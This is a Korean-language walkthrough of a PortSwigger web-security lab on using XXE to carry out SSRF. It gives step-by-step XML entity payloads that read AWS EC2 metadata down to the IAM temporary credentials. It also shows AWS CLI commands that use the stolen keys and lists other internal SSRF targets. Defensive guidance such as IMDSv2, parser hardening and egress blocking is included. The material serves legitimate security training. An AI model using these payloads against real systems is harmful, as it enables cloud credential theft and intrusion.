# Lab: Exploiting XXE to perform SSRF attacks

## 개요

- **난이도**: Apprentice
- **주제**: XXE → SSRF — 외부 엔티티로 내부 HTTP 요청 발생 / AWS EC2 메타데이터 탈취
- **링크**: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

## 목표

XXE 의 외부 엔티티에 `file://` 대신 `http://` URI 를 사용하면 서버가 내부 네트워크로 HTTP 요청을 보내는 SSRF 가 된다. `http://169.254.169.254/` (AWS EC2 메타데이터 서비스) 를 단계적으로 탐색해 IAM 보안 자격증명을 탈취한다.

## 001 랩과의 차이

```
[001 랩 — 로컬 파일 읽기]
  SYSTEM "file:///etc/passwd"
  → XML 파서가 로컬 파일시스템에서 파일 읽기
  → 파일 내용이 응답에 포함

[002 랩 (이번) — SSRF]
  SYSTEM "http://169.254.169.254/..."
  → XML 파서가 서버 내부에서 HTTP 요청 발생
  → 서버 내부에서만 접근 가능한 리소스에 접근
  → 응답 내용이 엔티티로 치환 → 응답에 포함
```

## SSRF 란

```
Server-Side Request Forgery

서버가 공격자가 지정한 URL 로 요청을 보내도록 유도

공격자가 직접 접근 불가능한 대상:
  → 내부 네트워크 (192.168.x.x, 10.x.x.x, 172.x.x.x)
  → 클라우드 메타데이터 서비스 (169.254.169.254)
  → 내부 관리 인터페이스 (admin panel, k8s API 등)
  → localhost 서비스 (DB, 캐시 서버 등)

서버가 대신 요청:
  공격자 → 서버(취약) → 내부 대상
  공격자는 서버를 프록시로 활용
```

## 169.254.169.254 — 클라우드 메타데이터 서비스

### 링크-로컬 주소 (Link-Local Address)

```
169.254.0.0/16 대역:
  APIPA (Automatic Private IP Addressing)
  → DHCP 서버 없을 때 자동 할당되는 주소
  → 외부 인터넷에서 직접 라우팅 불가
  → 같은 네트워크 세그먼트 내에서만 접근

169.254.169.254:
  클라우드 업체들이 메타데이터 서비스에 사용하는 특수 IP
  → EC2 인스턴스 내부에서만 접근 가능 (외부 불가)
  → 공격자가 직접 접근 불가 → SSRF 공격 대상으로 활용
```

### AWS EC2 Instance Metadata Service (IMDS)

```
AWS 가 EC2 인스턴스에 제공하는 내부 API

접근 방법:
  인스턴스 내부에서 HTTP GET → http://169.254.169.254/

제공 정보:
  인스턴스 ID, 타입, 리전
  네트워크 인터페이스 정보
  IAM 역할 임시 자격증명 ← 가장 위험
  퍼블릭/프라이빗 IP
  유저 데이터 (초기화 스크립트)

다른 클라우드 업체:
  Azure:  http://169.254.169.254/metadata/instance
  GCP:    http://metadata.google.internal/computeMetadata/v1/
  Oracle: http://169.254.169.254/opc/v1/instance/
```

### AWS 메타데이터 API 구조

```
http://169.254.169.254/
  └── latest/
       ├── meta-data/
       │    ├── instance-id
       │    ├── public-ipv4
       │    ├── local-ipv4
       │    ├── hostname
       │    ├── placement/
       │    │    └── availability-zone
       │    └── iam/
       │         └── security-credentials/
       │              └── <역할이름>     ← 임시 자격증명!
       ├── user-data               ← 초기화 스크립트 (비밀번호 포함 가능)
       └── dynamic/
            └── instance-identity/
                 └── document      ← 계정 ID, 리전, 인스턴스 ID
```

## 공격 방법 — 단계적 메타데이터 탐색

### 1단계: 루트 경로 탐색

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

```
응답:
  "Invalid product ID: latest"
  → 최상위 경로 확인
```

### 2단계: meta-data 경로 진입

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

```
응답:
  "Invalid product ID: ami-id
   ami-launch-index
   ami-manifest-path
   hostname
   iam
   instance-id
   ..."
```

### 3단계: IAM 자격증명 경로 탐색

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

```
응답:
  "Invalid product ID: admin"
  → IAM 역할 이름 확인: admin
```

### 4단계: 임시 자격증명 탈취

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```

```json
응답:
{
  "Code": "Success",
  "LastUpdated": "2024-01-01T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoXnyc4lcK4ZIAqf...(임시 세션 토큰)",
  "Expiration": "2024-01-01T06:00:00Z"
}
```

### 탈취한 자격증명 활용

```bash
# 공격자 측에서 AWS CLI 설정
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
export AWS_SESSION_TOKEN=AQoXnyc4lcK4ZIAqf...

# IAM 역할 권한에 따라 다양한 작업 가능
aws s3 ls                          # S3 버킷 목록
aws iam list-users                 # IAM 사용자 목록
aws ec2 describe-instances         # EC2 인스턴스 목록
aws secretsmanager list-secrets    # Secrets Manager 조회
```

## CSP(Cloud Security Posture) 관점 — 방어 전략

### IMDSv2 (Instance Metadata Service v2)

```
AWS 의 메타데이터 서비스 보안 강화 버전

IMDSv1 (취약):
  GET http://169.254.169.254/latest/meta-data/
  → 인증 없이 바로 접근 가능
  → SSRF 로 즉시 탈취 가능

IMDSv2 (강화):
  1단계: PUT 요청으로 세션 토큰 획득 (TTL 포함)
    PUT http://169.254.169.254/latest/api/token
    X-aws-ec2-metadata-token-ttl-seconds: 21600
    → 응답: <임시 토큰>

  2단계: 토큰으로 메타데이터 요청
    GET http://169.254.169.254/latest/meta-data/
    X-aws-ec2-metadata-token: <임시 토큰>
    → 인증된 요청만 응답

IMDSv2 가 SSRF 를 막는 이유:
  PUT 요청은 SSRF 에서 사용하기 어려움
    → XXE 파서는 GET 만 가능 (PUT 불가)
    → 대부분 SSRF 벡터가 GET 기반
  → 세션 토큰 없이 메타데이터 조회 불가
  → XXE-SSRF 로 IMDSv2 우회 불가

AWS 설정:
  # IMDSv2 강제 적용 (IMDSv1 비활성화)
  aws ec2 modify-instance-metadata-options \
    --instance-id i-xxxx \
    --http-tokens required \
    --http-endpoint enabled
```

### 클라우드별 메타데이터 방어

```
[AWS]
  IMDSv2 강제 (--http-tokens required)
  EC2 인스턴스에 IAM 역할 최소 권한 부여
  VPC Security Group 으로 아웃바운드 제한

[GCP]
  Metadata API v1 사용 (헤더 필수):
    Metadata-Flavor: Google
  → 헤더 없으면 응답 거부
  → 일반 SSRF 로는 탈취 어려움

[Azure]
  Metadata API 헤더 필수:
    Metadata: true
  → 헤더 없으면 거부
  → GCP 와 유사한 방어

결론:
  AWS IMDSv1 이 가장 취약
  GCP, Azure 는 필수 헤더로 SSRF 저항성 있음
  XXE 파서는 커스텀 헤더 추가 불가 → GCP/Azure 에서 제한적
```

### 서버 측 SSRF 방어

```
[1. XML 파서 외부 엔티티 차단] — 가장 근본적
  외부 엔티티 비활성화 시 http:// URI 도 처리 안 됨

[2. 네트워크 레벨 차단]
  WAS 의 아웃바운드 HTTP 요청을 방화벽으로 제한
  허용 목록(외부 API 등) 외 차단

  특히 차단해야 할 대역:
    169.254.0.0/16  → 클라우드 메타데이터
    10.0.0.0/8      → 내부 네트워크
    172.16.0.0/12   → 내부 네트워크
    192.168.0.0/16  → 내부 네트워크
    127.0.0.0/8     → localhost

[3. URL 검증]
  SSRF 가능한 파라미터에서 URL 검증:
    허용: https://api.approved-external.com
    차단: 내부 IP, localhost, 링크-로컬 주소

[4. IMDSv2 강제]
  클라우드 환경에서 IMDSv2 로 업그레이드
  GET 기반 SSRF 로 메타데이터 탈취 차단
```

## 핵심 정리

- XXE 의 `SYSTEM` URI 에 `http://` 를 사용하면 서버가 해당 URL 로 HTTP 요청을 보내는 SSRF 가 된다.
- `169.254.169.254` 는 클라우드 메타데이터 서비스 IP 로, 인스턴스 내부에서만 접근 가능 — XXE-SSRF 로 IAM 임시 자격증명 탈취가 가능하다.
- 메타데이터 API 는 디렉토리 목록 형태라 단계적으로 탐색해야 한다.
- **AWS IMDSv2** 는 PUT 기반 토큰 인증을 요구해 GET 기반 SSRF(XXE 포함)를 효과적으로 차단한다.
- 근본 방어는 XML 파서 레벨의 외부 엔티티 비활성화 + 네트워크 아웃바운드 제한이다.

## 배운 점 및 추가 학습

### 1. XXE-SSRF vs 일반 SSRF 비교

```
[일반 SSRF]
  URL 입력 파라미터 → 서버가 해당 URL fetch
  예: imageUrl=http://169.254.169.254/...

[XXE-SSRF (이번 랩)]
  XML 엔티티 URI → XML 파서가 해당 URL fetch
  SYSTEM "http://169.254.169.254/..."

공통점:
  서버가 공격자 지정 URL 로 요청
  내부 네트워크 탐색 가능

차이점:
  XXE-SSRF 는 XML 처리 경로에서만 발생
  헤더 추가 불가 → IMDSv2, GCP, Azure 우회 어려움
  응답이 엔티티로 치환 → 직접 반환됨
```

### 2. 메타데이터 이외 SSRF 타겟

```
[내부 서비스 탐색]
  http://localhost:8080/admin       → 내부 관리 패널
  http://localhost:6379/            → Redis (RESP 프로토콜)
  http://localhost:9200/            → Elasticsearch
  http://localhost:2375/containers/json → Docker API
  http://localhost:10255/pods       → Kubernetes kubelet

[클라우드 서비스]
  http://169.254.169.254/          → AWS/Azure/Oracle IMDS
  http://metadata.google.internal/ → GCP IMDS
  http://100.100.100.200/          → Alibaba Cloud IMDS

[내부 네트워크 스캔]
  http://192.168.1.1/              → 내부 라우터
  http://10.0.0.x/                 → 내부 서버 스캔
```

### 3. 001~002 랩 XXE 공격 패턴 비교

| 항목 | 001 (파일 읽기) | 002 (SSRF) |
|------|----------------|------------|
| URI 스킴 | `file://` | `http://` |
| 대상 | 로컬 파일시스템 | 내부 네트워크 서비스 |
| 탈취 정보 | `/etc/passwd` 등 | IAM 자격증명, 내부 API |
| 연계 공격 | 설정 파일 읽기 → DB 접속 | 클라우드 권한 상승 |
| 방어 | 파서 설정 + 파일 권한 | 파서 설정 + 네트워크 방화벽 + IMDSv2 |
